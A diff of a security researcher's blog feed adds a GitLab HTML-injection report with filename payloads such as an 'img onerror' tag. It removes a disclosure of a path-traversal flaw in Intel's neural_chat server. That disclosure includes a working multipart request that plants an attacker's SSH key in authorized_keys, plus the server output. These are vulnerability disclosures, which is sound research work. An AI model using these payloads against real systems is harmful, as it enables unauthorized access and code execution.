@@ -1,4 +1,156 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-20T15:31:42+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">2024 Intigriti CTF, some Web solution</title><link href="http://localhost:4000/ctf/2024/11/20/web.html" rel="alternate" type="text/html" title="2024 Intigriti CTF, some Web solution" /><published>2024-11-20T10:31:06+08:00</published><updated>2024-11-20T10:31:06+08:00</updated><id>http://localhost:4000/ctf/2024/11/20/web</id><content type="html" xml:base="http://localhost:4000/ctf/2024/11/20/web.html"><![CDATA[<h2 id="pizza-paradise-100p-395-solves">Pizza Paradise, 100p, 395 solves</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-25T09:18:20+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Gitlab Html Injection in file search</title><link href="http://localhost:4000/xss/2024/11/24/file-search-html-injection.html" rel="alternate" type="text/html" title="Gitlab Html Injection in file search" /><published>2024-11-24T10:31:06+08:00</published><updated>2024-11-24T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/11/24/file-search-html-injection</id><content type="html" xml:base="http://localhost:4000/xss/2024/11/24/file-search-html-injection.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Recently, I <a href="https://docs.gitlab.com/ee/user/project/repository/files/#search-for-a-file">searched for a file</a> in my project hosted on <a href="https://gitlab.com">gitlab.com</a>. After I pressed the <code class="language-plaintext highlighter-rouge">T</code> button, the file names in my repo were rendered with a popup box which is different from older style (such as gitlab-ee 16.9.0). So I created new file with name <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code>. After pressed the shortcut <code class="language-plaintext highlighter-rouge">T</code> again, the file name is rendered with a img, however no xss triggered. So I dig into it.</p>
+
+<p>First, in <a href="https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/super_sidebar/components/global_search/command_palette/command_palette_items.vue#L241">command_palette_items.vue</a>, <code class="language-plaintext highlighter-rouge">getProjectFiles</code> fetch all filenames which is not sanitized. And then pass these file names to <code class="language-plaintext highlighter-rouge">search-item</code> for rendering.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async getProjectFiles() {
+      if (!this.projectFiles.length) {
+        this.loading = true;
+
+        try {
+          const response = await axios.get(this.projectFilesPath);
+          this.projectFiles = response?.data.map(fileMapper.bind(null, this.projectBlobPath));
+        } catch (error) {
+          Sentry.captureException(error);
+        } finally {
+          this.loading = false;
+        }
+      }
+
+      this.groups = [
+        {
+          name: PATH_GROUP_TITLE,
+          items: this.filteredProjectFiles,
+        },
+      ];
+    },
+...
+&lt;template #list-item="{ item }"&gt;
+    &lt;search-item :item="item" :search-query="searchQuery" /&gt;
+&lt;/template&gt;
+</code></pre></div></div>
+
+<p>Then, in <a href="https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/super_sidebar/components/global_search/command_palette/search_item.vue#L27"><code class="language-plaintext highlighter-rouge">search_item.vue</code></a>, the file name is passed to <code class="language-plaintext highlighter-rouge">highlight</code> for sanitizing and highlighting. After highlighted, the <code class="language-plaintext highlighter-rouge">highlightedName</code> is passed to <code class="language-plaintext highlighter-rouge">&lt;span v-safe-html="highlightedName" class="gl-text-gray-900"&gt;&lt;/span&gt;</code> for rendering.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>highlightedName() {
+      return highlight(this.item.text, this.searchQuery);
+    }
+...
+// https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/super_sidebar/components/global_search/command_palette/search_item.vue#L49
+&lt;span class="gl-display-flex gl-flex-direction-column"&gt;
+      &lt;span v-safe-html="highlightedName" class="gl-text-gray-900"&gt;&lt;/span&gt;
+      &lt;span
+        v-if="item.namespace"
+        v-safe-html="item.namespace"
+        class="gl-font-sm gl-text-gray-500"
+      &gt;&lt;/span&gt;
+    &lt;/span&gt;
+</code></pre></div></div>
+<p>However in <a href="https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/lib/utils/highlight.js#L24"><code class="language-plaintext highlighter-rouge">highlight.js</code></a>, when <code class="language-plaintext highlighter-rouge">match</code> is empty string, the filename is return without any sanitizing which means if we search files without any query string, the raw html filename is rendered without sanitizing.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export default function highlight(string, match = '', matchPrefix = '&lt;b&gt;', matchSuffix = '&lt;/b&gt;') {
+  if (!string) {
+    return '';
+  }
+
+  if (!match) {
+    return string;
+  }
+
+  const sanitizedValue = sanitize(string.toString(), { ALLOWED_TAGS: [] });
+...
+</code></pre></div></div>
+<p>In older verion of gitlab(such as gitlab-ee 16.9.0), the filename was sanitized properly in <a href="https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/projects/project_find_file.js#L112"><code class="language-plaintext highlighter-rouge">project_find_file.js</code></a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>renderList(filePaths, searchText) {
+
+     ...
+      let blobItemUrl = joinPaths(this.options.blobUrlTemplate, escapeFileUrl(filePath));
+
+      if (this.options.refType) {
+        const blobUrlObject = new URL(blobItemUrl, window.location.origin);
+        blobUrlObject.searchParams.append('ref_type', this.options.refType);
+        blobItemUrl = blobUrlObject.toString();
+      }
+      const html = ProjectFindFile.makeHtml(filePath, matches, blobItemUrl);
+      results.push(this.element.find('.tree-table &gt; tbody').append(html));
+    }
+
+    this.element.find('.empty-state').toggleClass('hidden', Boolean(results.length));
+
+    return results;
+  }
+</code></pre></div></div>
+<p>I tried to find a bypass to <code class="language-plaintext highlighter-rouge">v-safe-html</code> but failed,  the sanitizer is Dompurify 3.1.5 which doesn’t have any bypassing. But in <a href="https://github.com/cure53/DOMPurify/releases/tag/3.1.3">Dompurify 3.1.3</a>,  a mXSS was found which may have ability to inject xss in this case, but after I dig into that, the mutation need <code class="language-plaintext highlighter-rouge">//</code> comment in html attributes which is not valid filename.</p>
+
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+
+<ol>
+  <li>Go to gitlab.com and in your repository create a new file using Gitlab UI, using the filename such as <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=console.log(1)&gt;</code>, with random file content.</li>
+  <li>Commit changes to finish creating file.</li>
+  <li>Press key <code class="language-plaintext highlighter-rouge">T</code> to trigger the search box, the broken img is rendered.</li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>If bypass is found in Dompurify, victims may trigger the xss in a malicious repository when they try to find files in that repo in self-host gitlab instance with csp disabled.</p>
+
+<h3 id="what-is-the-current-bug-behavior">What is the current <em>bug</em> behavior?</h3>
+
+<p>Files with raw html names are rendered without sanitizing when searching files.</p>
+
+<h3 id="what-is-the-expected-correct-behavior">What is the expected <em>correct</em> behavior?</h3>
+
+<p>Files with raw html names are rendered sanitized properly when searching files.</p>
+
+<h3 id="relevant-logs-andor-screenshots">Relevant logs and/or screenshots</h3>
+
+<p><img src="/assets/gitlab/file-search/gitlab-html-injection2.png" alt="img2" /></p>
+
+<h4 id="results-of-gitlab-environment-info">Results of GitLab environment info</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>System information
+System:
+Proxy:          no
+Current User:   git
+Using RVM:      no
+Ruby Version:   3.1.5p253
+Gem Version:    3.5.11
+Bundler Version:2.5.11
+Rake Version:   13.0.6
+Redis Version:  7.0.15
+Sidekiq Version:7.1.6
+Go Version:     unknown
+
+GitLab information
+Version:        17.1.0-pre
+Revision:       ab5fd7f7792
+Directory:      /opt/gitlab/embedded/service/gitlab-rails
+DB Adapter:     PostgreSQL
+DB Version:     14.11
+URL:            http://10.15.0.5
+HTTP Clone URL: http://10.15.0.5/some-group/some-project.git
+SSH Clone URL:  git@10.15.0.5:some-group/some-project.git
+Elasticsearch:  no
+Geo:            no
+Using LDAP:     no
+Using Omniauth: yes
+Omniauth Providers:
+
+GitLab Shell
+Version:        14.35.0
+Repository storages:
+- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket
+GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
+
+Gitaly
+- default Address:      unix:/var/opt/gitlab/gitaly/gitaly.socket
+- default Version:      17.0.0-rc2-314-g68ace2015
+- default Git Version:  2.45.1
+</code></pre></div></div>
+
+<h2 id="impact-1">Impact</h2>
+
+<p>If bypass is found in Dompurify, victims may trigger the xss in a malicious repository when they try to find files in that repo in self-host gitlab instance with csp disabled.</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Recently, I searched for a file in my project hosted on gitlab.com. After I pressed the T button, the file names in my repo were rendered with a popup box which is different from older style (such as gitlab-ee 16.9.0). So I created new file with name &lt;img src=x onerror=alert()&gt;. After pressed the shortcut T again, the file name is rendered with a img, however no xss triggered. So I dig into it.]]></summary></entry><entry><title type="html">2024 Intigriti CTF, some Web solution</title><link href="http://localhost:4000/ctf/2024/11/20/web.html" rel="alternate" type="text/html" title="2024 Intigriti CTF, some Web solution" /><published>2024-11-20T10:31:06+08:00</published><updated>2024-11-20T10:31:06+08:00</updated><id>http://localhost:4000/ctf/2024/11/20/web</id><content type="html" xml:base="http://localhost:4000/ctf/2024/11/20/web.html"><![CDATA[<h2 id="pizza-paradise-100p-395-solves">Pizza Paradise, 100p, 395 solves</h2>
 
 <ol>
   <li>
@@ -1013,163 +1165,4 @@ Content-Length: 89
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>]]></content><author><name></name></author><category term="file-deletion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat.</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>v1.4.2</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296"><code class="language-plaintext highlighter-rouge">/v1/askdoc/upload_files</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">file_paths</code> parameter which allows the uploading of arbitrary files. The <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L308C32-L308C42"><code class="language-plaintext highlighter-rouge">file_path</code></a> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">without sanitization</a> and the file content is writen to dest location. An attacker can upload and overwrite <strong>ANY</strong> file on the filesystem. This can lead to remote code execution in many different ways.</p>
-
-<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/v1/askdoc/upload_files")
-async def retrieval_add_files(request: Request,
-                           files: List[UploadFile] = File(...),
-                           file_paths: List[str] = Form(...),
-                           knowledge_base_id: str = Form(...)):
-    ...
-    for file_path, file in zip(file_paths, files):
-        filename = file.filename
-        if '/' in filename:
-            filename = filename.split('/')[-1]
-        logger.info(f"[askdoc - upload_files] received file: {filename}, kb_id: {kb_id}")
-        user_id = request.client.host
-        logger.info(f'[askdoc - upload_files] user id: {user_id}')
-
-        path_prefix = get_path_prefix(kb_id, user_id)
-        upload_path = path_prefix + '/upload_dir'
-        persist_path = path_prefix + '/persist_dir'
-        save_path = Path(upload_path) / file_path
-        save_path.parent.mkdir(parents=True, exist_ok=True)
-
-        # save file content to local disk
-        await save_file_to_local_disk(save_path, file)
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
-
-<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the neural_chat service and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
-cat: /home/kali/.ssh/authorized_keys: No such file or directory
-</code></pre></div></div>
-
-<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
-
-<p>We start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
-sudo apt-get update
-sudo apt-get install -y python3-pip
-sudo apt-get install -y libgl1-mesa-glx
-
-# clone the project
-git clone https://github.com/intel/intel-extension-for-transformers.git
-cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/
-
-# Install python requirements
-pip install -r requirements_cpu.txt
-pip install fastapi==0.103.2
-pip install intel-extension-for-transformers
-</code></pre></div></div>
-
-<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
-neuralchat_server start --config_file ./server/config/neuralchat.yaml
-</code></pre></div></div>
-
-<p>Send follow post request to the server using burpsuite:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://10.15.0.5:8000/v1/askdoc/upload_files HTTP/1.1
-Host: 10.15.0.5:8000
-Pragma: no-cache
-Cache-Control: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvIlRA9q70krSRDb7
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Cookie: 
-Connection: close
-Content-Length: 409
-
-------WebKitFormBoundaryvIlRA9q70krSRDb7
-Content-Disposition: form-data; name="knowledge_base_id"
-
-123
-------WebKitFormBoundaryvIlRA9q70krSRDb7
-Content-Disposition: form-data; name="files"; filename="blob"
-Content-Type: text/plain
-
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
-------WebKitFormBoundaryvIlRA9q70krSRDb7
-Content-Disposition: form-data; name="file_paths"
-
-/home/kali/.ssh/authorized_keys
-------WebKitFormBoundaryvIlRA9q70krSRDb7--
-</code></pre></div></div>
-
-<p>The response indicates error but the file is written successfully.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Content-Length: 39
-Connection: keep-alive
-Content-Type: application/json
-Date: Mon, 27 May 2024 07:41:53 GMT
-Keep-Alive: timeout=4
-Proxy-Connection: keep-alive
-Server: uvicorn
-
-"Error occurred while uploading files."
-</code></pre></div></div>
-
-<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
-</code></pre></div></div>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<h3 id="ssh-access">SSH Access</h3>
-
-<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<h3 id="web-servers">Web Servers</h3>
-
-<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>]]></content><author><name></name></author><category term="file-deletion" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
